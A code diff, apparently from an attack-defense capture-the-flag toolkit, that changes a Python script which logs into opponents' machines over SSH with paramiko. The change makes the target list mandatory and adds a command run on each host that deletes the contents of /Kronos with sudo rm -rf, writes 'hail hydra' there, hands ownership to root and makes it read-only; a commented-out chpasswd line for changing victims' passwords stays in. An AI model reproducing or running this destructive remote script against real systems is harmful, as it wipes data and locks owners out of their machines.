@@ -25,7 +25,7 @@ db = mc[database_info.get('name') or 'AWD']
 
 def TurnOn():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-e', '--enemise', dest='enemise', nargs='+', help='enemy 2 destroy')
+    parser.add_argument('-e', '--enemise', dest='enemise', nargs='+', required=True, help='enemy 2 destroy')
     parser.add_argument('-o', '--oldpwd', dest='old_pwd', nargs='+', help='the old password')
     parser.add_argument('-n', '--newpwd', dest='new_pwd', help='the new password')
     parser.add_argument('-O', '--out', dest='output',  help='output results file')
@@ -113,6 +113,9 @@ def change_enemy(enemy, names, old_pwd, new_pwd):
 
                # payload1 = f"echo '{name}:{new_pwd}' | chpasswd"
                # std_in, std_out, std_err = ssh_client.exec_command(payload1)
+                get_score = "sudo rm -rf /Kronos/* && echo 'hail hydra' | sudo tee /Kronos/hydra && sudo chown -R root /Kronos && sudo chmod 444 /Kronos"
+                ssh_client.exec_command(get_score)
+                ssh_client.close()
             except paramiko.AuthenticationException:
                 print(f'[-] error old pwd for user <{name}> at <{enemy}>')
             else:
